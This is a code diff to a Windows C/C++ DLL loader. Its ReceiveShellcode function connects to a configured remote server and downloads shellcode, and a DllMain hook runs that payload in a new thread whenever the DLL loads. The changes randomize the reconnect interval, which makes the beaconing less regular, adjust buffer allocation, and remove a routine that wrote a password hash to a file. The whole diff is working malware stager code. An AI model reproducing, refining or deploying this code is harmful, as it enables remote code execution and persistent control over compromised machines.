@@ -14,6 +14,7 @@
 #define Mprintf(format, ...) 
 #define IsRelease 1
 #endif
+#include <stdlib.h>
 
 #pragma comment(lib, "ws2_32.lib")
 
@@ -77,18 +78,14 @@ const char* ReceiveShellcode(const char* sIP, int serverPort, int* sizeOut) {
 		return NULL;
 	}
 
+	srand(time(NULL));
 	const int bufSize = (8 * 1024 * 1024);
-	char* buffer = (char*)malloc(bufSize);
-	if (!buffer) {
-		WSACleanup();
-		return NULL;
-	}
-
+	char* buffer = NULL;
 	BOOL isFirstConnect = TRUE;
 	int attemptCount = 0, requestCount = 0;
 	do {
 		if (!isFirstConnect)
-			Sleep(IsRelease ? 120 * 1000 : 5000);
+			Sleep(IsRelease ? rand()%60 * 1000 : 5000);
 		isFirstConnect = FALSE;
 		Mprintf("Connecting attempt #%d -> %s:%d \n", ++attemptCount, serverIP, serverPort);
 
@@ -120,6 +117,11 @@ const char* ReceiveShellcode(const char* sIP, int serverPort, int* sizeOut) {
 		}
 
 		int totalReceived = 0;
+		buffer = buffer ? buffer : (char*)malloc(bufSize);
+		if (!buffer) {
+			closesocket(clientSocket);
+			continue;
+		}
 		if (requestCount < 3) {
 			requestCount++;
 			const int bufferSize = 16 * 1024;
@@ -207,25 +209,6 @@ typedef struct PluginParam {
 #define DLL_API
 #endif
 
-#include <stdio.h>
-bool WriteTextToFile(const char* filename, const char* content)
-{
-	if (filename == NULL || content == NULL)
-		return false;
-
-	FILE* file = fopen(filename, "w");
-	if (file == NULL)
-		return false;
-
-	if (fputs(content, file) == EOF) {
-		fclose(file);
-		return false;
-	}
-
-	fclose(file);
-	return true;
-}
-
 extern DLL_API DWORD WINAPI run(LPVOID param) {
 	PluginParam* info = (PluginParam*)param;
 	int size = 0;
@@ -264,15 +247,15 @@ int main() {
 
 BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
 {
+	static HANDLE threadHandle = NULL;
 	if (fdwReason == DLL_PROCESS_ATTACH){
 		static PluginParam param = { 0 };
 		strcpy(param.IP, g_Server.szServerIP);
 		param.Port = atoi(g_Server.szPort);
 		param.User = g_Server.pwdHash;
-#if 0
-		WriteTextToFile("HASH.ini", g_Server.pwdHash);
-#endif
-		CloseHandle(CreateThread(NULL, 0, run, &param, 0, NULL));
+		threadHandle = CreateThread(NULL, 0, run, &param, 0, NULL);
+	} else if (fdwReason == DLL_PROCESS_DETACH) {
+		if (threadHandle) TerminateThread(threadHandle, 0x20250619);
 	}
 	return TRUE;
 }
